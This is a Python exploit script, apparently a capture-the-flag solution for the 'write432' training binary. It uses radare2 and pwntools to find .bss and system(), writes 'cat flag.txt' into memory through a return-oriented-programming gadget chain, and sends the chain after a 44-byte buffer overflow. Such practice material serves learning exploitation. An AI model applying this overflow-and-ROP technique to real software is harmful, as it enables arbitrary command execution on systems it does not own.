import r2pipe
from pwn import *
import gadgets

binary = './write432'
padding = 44

def hex2int(s):
    return int(s[2:], 16)

r2 = r2pipe.open(binary)
r2.cmd('aaaa')

sections = r2.cmdj('iSj')
bss_addr = None
for sec in sections:
    if sec['name'] == '.bss':
        bss_addr = sec['vaddr']

print(bss_addr)

system_addr = hex2int(r2.cmd('is~system').strip().split()[2])

# put content here (define payload)
payload = b''
payload += gadgets.pop_edi_ebp(bss_addr, 0x20746163)
payload += gadgets.mov_ptr_edi_ebp()
payload += gadgets.pop_edi_ebp(bss_addr + 4, 0x67616c66)
payload += gadgets.mov_ptr_edi_ebp()
payload += gadgets.pop_edi_ebp(bss_addr + 8, 0x7478742e)
payload += gadgets.mov_ptr_edi_ebp()
payload += gadgets.pop_edi_ebp(bss_addr + 12, 0)
payload += gadgets.mov_ptr_edi_ebp()
payload += p32(system_addr) + p32(gadgets.pop_ebp_addr) + p32(bss_addr)
# end of content

p = process(binary)
p.sendline(b'a' * padding + payload)
p.wait()
print(p.recvall().decode())
